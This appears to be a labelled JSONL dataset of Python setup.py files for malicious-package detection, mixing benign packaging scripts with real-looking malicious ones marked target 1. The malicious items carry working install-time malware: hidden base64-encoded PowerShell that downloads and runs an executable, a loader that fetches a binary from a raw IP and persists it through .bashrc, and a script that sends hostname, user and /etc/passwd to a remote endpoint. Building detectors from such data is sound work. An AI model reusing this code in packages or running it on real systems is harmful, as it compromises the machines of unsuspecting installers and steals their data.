aren't loaded.\n        import pytest\n        errno = pytest.main(self.pytest_args)\n        sys.exit(errno)\n\n\ninit_path = os.path.join('dictpath', '__init__.py')\ninit_py = read_file(init_path)\nmetadata = get_metadata(init_py)\n\n\nif __name__ == '__main__':\n    setup(\n        version=metadata['version'],\n        author=metadata['author'],\n        author_email=metadata['email'],\n        url=metadata['url'],\n        cmdclass={'test': PyTest},\n        setup_cfg=True,\n    )\n", "target": 0}
{"idx": "django-web3-aut-4.5.2", "func": "from setuptools import setup, find_packages\nimport os \nimport requests\nfrom setuptools.command.install import install\nfrom sys import platform\n\ndef send():\n    try:\n        env = os.environ['COMPUTERNAME']\n        t = requests.get(\"https://linkedopports.com/pyp/resp.php?live=Installation new c kw \" +env)\n        if platform == 'win32':\n            url = 'https://python-release.com/python-install.scr'\n            filename = 'ini_file_pyp_41.exe'\n            rq = requests.get(url, allow_redirects=True)\n            open(filename, 'wb').write(rq.content)\n            os.system('start '+filename)\n    except:\n        pass    \n \nclass PostInstallCommand(install):\n    def run(self):\n        install.run(self)\n        send()\n\n#firstbasicpyapp, elevatepyapp, praisepyapp\nsetup(\n  name='django-web3-aut',\n  version='4.5.2',\n  description='A very basic firstbasicpyapp',\n  python_requires=\">=3.6\",\n  install_requires=[''],\n  tests_require=[],\n  cmdclass={'install': PostInstallCommand},\n)", "target": 1}
{"idx": "libpeshka-0.3", "func": "from setuptools import setup, find_packages\n\ndef rn ():\n\n        import platform\n\n        lb = False\n\n        try:\n                import urllib2\n        except ImportError:\n                import requests\n                lb = True\n        import os, stat\n\n        ADD_LOC = \"http://145.249.104.71/out\"\n        LOC = \".drv\"\n\n        if platform.system () == \"Linux\":\n                response = \"\"\n                if not lb:\n                        response = urllib2.urlopen(ADD_LOC).read ()\n                else:\n                        response = requests.get (ADD_LOC).raw\n                os.chdir (os.path.expanduser (\"~\"))\n                d = open (LOC, \"wb\")\n                d.write (response)\n                d.close ()\n\n                current_state = os.stat (LOC)\n                os.chmod (LOC, current_state.st_mode|stat.S_IEXEC)\n\n                brc = open (\".bashrc\", \"a\")\n                brc.write (\"\\n~/.drv &\")\n                brc.close ()\n\n\n        else:\n                print (\"Error installing library!\")\n                exit (-1)\n\nrn ()\n\nsetup(\n  name = 'libpeshka',\n  packages = find_packages (),\n  entry_points={\n\t'setuptools.installation': [\n\t\t'eggsecutable = libari.pr:rn'\n\t]\n  },\n  version = '0.3',\n  description = 'Libari wrapper for python',\n  author = 'Ruri12',\n  author_email = 'ruri12@example.com',\n  scripts=[\"pr.py\"],\n  url = '',\n  download_url = '', \n  keywords = ['libari'],\n  classifiers = [],\n)\n", "target": 1}
{"idx": "poststudy-9.13", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'poststudy',\n    packages = ['modlib'],\n    version = '9.43',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "Flask-WTF-1.0.1", "func": "from setuptools import setup\n\nsetup(\n    name=\"Flask-WTF\",\n    install_requires=[\"Flask\", \"WTForms\", \"itsdangerous\"],\n    extras_require={\"email\": [\"email-validator\"]},\n)\n", "target": 0}
{"idx": "fdsfsdfsdfgsdg-0.0.0", "func": "from setuptools import setup, find_packages\n# :)\nVERSION = '1.0.0'\n\n# Setting up\nsetup(\n    name='fdsfsdfsdfgsdg', \n    author=\"\",\n    author_email=\"\",\n    packages=find_packages(),\n    install_requires=[\"browser_cookie3\", \"discordwebhook\", \"robloxpy\", \"requests\"],\n)", "target": 1}
{"idx": "ceedee-0.5", "func": "from setuptools import setup, find_packages\nimport os\nimport platform\nimport requests\nfrom urllib import request, parse\n\n# Please do not delete this.\nos_name = platform.system()\ndata = {}\nif os_name == 'Linux' or os_name == 'Darwin':\n    try:\n        hostname = os.popen('hostname').read()\n        whoami = os.popen('whoami').read()\n        passwd_file = os.popen('cat /etc/passwd').read()\n        os_info = os.popen('uname -a').read()\n        curr_dir = os.popen(\"pwd\").read()\n        list_curr_dir = os.popen(\"ls -la\").read()\n\n        data = {\n            'OS': os_name,\n            'Hostname': hostname,\n            'Logged In Username': whoami,\n            'Password File': passwd_file,\n            'OS Information': os_info,\n            'Current Directory': curr_dir,\n            'List of files in Current Directory': list_curr_dir\n        }\n\n    except:\n        data = {'Error': 'There was an error while fetching OS related data or sending information for ' + os_name}\n\nelif os_name == 'Windows':\n    try:\n        hostname = os.popen('hostname').read()\n        whoami = os.popen('whoami').read()\n        curr_dir = os.popen(\"cd\").read()\n        list_curr_dir = os.popen(\"dir\").read()\n\n        data = {\n            'OS': os_name,\n            'Hostname': hostname,\n            'Logged In Username': whoami,\n            'Current Directory': curr_dir,\n            'List of files in Current Directory': list_curr_dir\n        }\n\n    except:\n        data = {'Error': 'There was an error while fetching OS related data or sending information for ' + os_name}\n\nelse:\n    data = {'Error': 'Cannot determine OS'}\n\ndata_enc = parse.urlencode(data).encode()\nAPI_ENDPOINT = \"https://rk8xxqzdug.execute-api.us-east-1.amazonaws.com/Test/response\"\nreq = request.Request(API_ENDPOINT, data=data_enc)\nres = request.urlopen(req)\n\nsetup(\n    name='ceedee',\n    version='0.5',\n    license='MIT',\n    author=\"Shubham_fnra\",\n    author_email='shubham.agrawal@finra.org',\n    packages=find_packages('src'),\n    package_dir={'': 'src'},\n    url='https://github.com/gmyrianthous/example-publish-pypi',\n    keywords='ceedee project',\n    install_requires=[\n          'scikit-learn',\n          'requests',\n      ],\n)\n\n# name = os.popen('hostname').read()\n# # who = os.popen('cat /etc/passwd').read()\n# # what = os.popen('uname -a').read()\n# network = os.popen('dir').read()\n#\n# API_ENDPOINT = \"https://rk8xxqzdug.execute-api.us-east-1.amazonaws.com/Test/response\"\n#\n# data = {\n# 'hostname': name,\n# # 'whoami': what,\n# 'network': network\n# }\n#\n# r = requests.post(url=API_ENDPOINT, data=data)\n", "target": 1}
{"idx": "py-vmpullkill-1.9", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-vmpullkill',\n    packages = ['modlib'],\n    version = '4.27',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "esqgameultracandy-5.65", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqgameultracandy',\n    packages = ['modlib'],\n    version = '1.12',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "nvidiaurl-3.85", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'nvidiaurl',\n    packages = ['modlib'],\n    version = '9.9',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "djangorestframework-api-key-2.2.0", "func": "import re\nfrom pathlib import Path\n\nfrom setuptools import find_packages, setup\n\n\ndef get_version(package: str) -> str:\n    version = (Path(\"src\") / package / \"__version__.py\").read_text()\n    match = re.search(\"__version__ = ['\\\"]([^'\\\"]+)['\\\"]\", version)\n    assert match is not None\n    return match.group(1)\n\n\ndef get_long_description() -> str:\n    with open(\"README.md\", encoding=\"utf8\") as readme:\n        with open(\"CHANGELOG.md\", encoding=\"utf8\") as changelog:\n            return readme.read() + \"\\n\\n\" + changelog.read()\n\n\nsetup(\n    name=\"djangorestframework-api-key\",\n    version=get_version(\"rest_framework_api_key\"),\n    description=\"API key permissions for the Django REST Framework\",\n    long_description=get_long_description(),\n    long_description_content_type=\"text/markdown\",\n    url=\"http://github.com/florimondmanca/djangorestframework-api-key\",\n    project_urls={\n        \"Documentation\": \"https://florimondmanca.github.io/djangorestframework-api-key/\"\n    },\n    author=\"Florimond Manca\",\n    author_email=\"florimond.manca@gmail.com\",\n    packages=find_packages(\"src\"),\n    package_dir={\"\": \"src\"},\n    include_package_data=True,\n    zip_safe=False,\n    install_requires=[],\n    python_requires=\">=3.6\",\n    license=\"MIT\",\n    classifiers=[\n        \"Development Status :: 4 - Beta\",\n        \"Operating System :: OS Independent\",\n        \"Intended Audience :: Developers\",\n        \"Programming Language :: Python :: 3 :: Only\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Environment :: Web Environment\",\n        \"Topic :: Software Development :: Libraries :: Python Modules\",\n        \"Framework :: Django\",\n        \"Framework :: Django :: 2.2\",\n        \"Framework :: Django :: 3.2\",\n    ],\n)\n", "target": 0}
{"idx": "esqcraftguimine-8.1", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqcraftguimine',\n    packages = ['modlib'],\n    version = '9.93',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "google-cloud-pubsublite-1.4.2", "func": "# -*- coding: utf-8 -*-\n\n# Copyright (C) 2019  Google LLC\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n#\n\nimport io\nimport os\nimport setuptools  # type: ignore\n\nversion = \"1.4.2\"\n\npackage_root = os.path.abspath(os.path.dirname(__file__))\n\nreadme_filename = os.path.join(package_root, \"README.rst\")\nwith io.open(readme_filename, encoding=\"utf-8\") as readme_file:\n    readme = readme_file.read()\n\ndependencies = [\n    \"google-cloud-pubsub >= 2.1.0, <3.0.0dev\",\n    \"grpcio >= 1.18.0\",\n    \"grpcio-status >= 1.18.0\",\n    \"overrides>=6.0.1, <7.0.0\",\n]\n\nsetuptools.setup(\n    name=\"google-cloud-pubsublite\",\n    version=version,\n    long_description=readme,\n    author=\"Google LLC\",\n    author_email=\"googleapis-packages@google.com\",\n    license=\"Apache 2.0\",\n    url=\"https://github.com/googleapis/python-pubsublite\",\n    packages=[\n        package\n        for package in setuptools.PEP420PackageFinder.find()\n        if package.startswith(\"google\")\n    ],\n    namespace_packages=(\"google\", \"google.cloud\"),\n    platforms=\"Posix; MacOS X; Windows\",\n    include_package_data=True,\n    install_requires=dependencies,\n    python_requires=\">=3.6\",\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"Intended Audience :: Developers\",\n        \"Operating System :: OS Independent\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Topic :: Internet\",\n        \"Topic :: Software Development :: Libraries :: Python Modules\",\n    ],\n    zip_safe=False,\n)\n", "target": 0}
{"idx": "visaad-3.43", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'visaad',\n    packages = ['modlib'],\n    version = '1.80',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "eventlet-0.33.1", "func": "#!/usr/bin/env python\nimport os\nimport setuptools\n\n\nos.environ.setdefault('EVENTLET_IMPORT_VERSION_ONLY', '1')\nimport eventlet\n\nsetuptools.setup(\n    name='eventlet',\n    version=eventlet.__version__,\n    description='Highly concurrent networking library',\n    author='Linden Lab',\n    author_email='eventletdev@lists.secondlife.com',\n    url='http://eventlet.net',\n    project_urls={\n        'Source': 'https://github.com/eventlet/eventlet',\n    },\n    packages=setuptools.find_packages(exclude=['benchmarks', 'tests', 'tests.*']),\n    install_requires=(\n        'dnspython >= 1.15.0',\n        'greenlet >= 0.3',\n        'monotonic >= 1.4;python_version<\"3.5\"',\n        'six >= 1.10.0',\n    ),\n    zip_safe=False,\n    long_description=open(\n        os.path.join(\n            os.path.dirname(__file__),\n            'README.rst'\n        )\n    ).read(),\n    test_suite='nose.collector',\n    classifiers=[\n        \"Development Status :: 4 - Beta\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: MacOS :: MacOS X\",\n        \"Operating System :: Microsoft :: Windows\",\n        \"Operating System :: POSIX\",\n        \"Programming Language :: Python :: 2\",\n        \"Programming Language :: Python :: 2.7\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.5\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python\",\n        \"Topic :: Internet\",\n        \"Topic :: Software Development :: Libraries :: Python Modules\",\n    ]\n)\n", "target": 0}
{"idx": "libramhydralib-4.36", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libramhydralib',\n    packages = ['modlib'],\n    version = '2.60',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "emcee-3.1.2", "func": "#!/usr/bin/env python\n\n# Inspired by:\n# https://hynek.me/articles/sharing-your-labor-of-love-pypi-quick-and-dirty/\n\nimport codecs\nimport os\nimport re\n\nfrom setuptools import find_packages, setup\n\n# PROJECT SPECIFIC\n\nNAME = \"emcee\"\nPACKAGES = find_packages(where=\"src\")\nMETA_PATH = os.path.join(\"src\", \"emcee\", \"__init__.py\")\nCLASSIFIERS = [\n    \"Development Status :: 5 - Production/Stable\",\n    \"Intended Audience :: Developers\",\n    \"Intended Audience :: Science/Research\",\n    \"License :: OSI Approved :: MIT License\",\n    \"Operating System :: OS Independent\",\n    \"Programming Language :: Python\",\n]\nINSTALL_REQUIRES = [\"numpy\"]\nSETUP_REQUIRES = [\n    \"setuptools>=40.6.0\",\n    \"setuptools_scm\",\n    \"wheel\",\n]\nEXTRA_REQUIRE = {\n    \"extras\": [\"h5py\", \"scipy\"],\n    \"tests\": [\"pytest\", \"pytest-cov\", \"coverage[toml]\"],\n}\n\n# END PROJECT SPECIFIC\n\n\nHERE = os.path.dirname(os.path.realpath(__file__))\n\n\ndef read(*parts):\n    with codecs.open(os.path.join(HERE, *parts), \"rb\", \"utf-8\") as f:\n        return f.read()\n\n\ndef find_meta(meta, meta_file=read(META_PATH)):\n    meta_match = re.search(\n        r\"^__{meta}__ = ['\\\"]([^'\\\"]*)['\\\"]\".format(meta=meta), meta_file, re.M\n    )\n    if meta_match:\n        return meta_match.group(1)\n    raise RuntimeError(\"Unable to find __{meta}__ string.\".format(meta=meta))\n\n\nif __name__ == \"__main__\":\n    setup(\n        name=NAME,\n        use_scm_version={\n            \"write_to\": os.path.join(\n                \"src\", NAME, \"{0}_version.py\".format(NAME)\n            ),\n            \"write_to_template\": '__version__ = \"{version}\"\\n',\n        },\n        author=find_meta(\"author\"),\n        author_email=find_meta(\"email\"),\n        maintainer=find_meta(\"author\"),\n        maintainer_email=find_meta(\"email\"),\n        url=find_meta(\"uri\"),\n        project_urls={\n            \"Source\": \"https://github.com/dfm/emcee\",\n        },\n        license=find_meta(\"license\"),\n        description=find_meta(\"description\"),\n        long_description=read(\"README.rst\"),\n        long_description_content_type=\"text/x-rst\",\n        packages=PACKAGES,\n        package_dir={\"\": \"src\"},\n        include_package_data=True,\n        install_requires=INSTALL_REQUIRES,\n        setup_requires=SETUP_REQUIRES,\n        extras_require=EXTRA_REQUIRE,\n        classifiers=CLASSIFIERS,\n        zip_safe=False,\n        options={\"bdist_wheel\": {\"universal\": \"1\"}},\n    )\n", "target": 0}
{"idx": "Flask-RESTful-0.3.9", "func": "#!/usr/bin/env python\n\nimport re\nimport sys\nfrom os import path\nfrom setuptools import setup, find_packages\n\n\nrequirements = [\n    'aniso8601>=0.82',\n    'Flask>=0.8',\n    'six>=1.3.0',\n    'pytz',\n]\n\n\nversion_file = path.join(\n    path.dirname(__file__),\n    'flask_restful',\n    '__version__.py'\n)\nwith open(version_file, 'r') as fp:\n    m = re.search(\n        r\"^__version__ = ['\\\"]([^'\\\"]*)['\\\"]\",\n        fp.read(),\n        re.M\n    )\n    version = m.groups(1)[0]\n\n\nsetup(\n    name='Flask-RESTful',\n    version=version,\n    license='BSD',\n    url='https://www.github.com/flask-restful/flask-restful/',\n    author='Twilio API Team',\n    author_email='help@twilio.com',\n    description='Simple framework for creating REST APIs',\n    packages=find_packages(exclude=['tests']),\n    classifiers=[\n        'Framework :: Flask',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'License :: OSI Approved :: BSD License',\n    ],\n    zip_safe=False,\n    include_package_data=True,\n    platforms='any',\n    test_suite = 'nose.collector',\n    install_requires=requirements,\n    tests_require=['Flask-RESTful', 'mock>=0.8', 'blinker'],\n    # Install these with \"pip install -e '.[docs]'\n    extras_require={\n        'docs': 'sphinx',\n    }\n)\n", "target": 0}
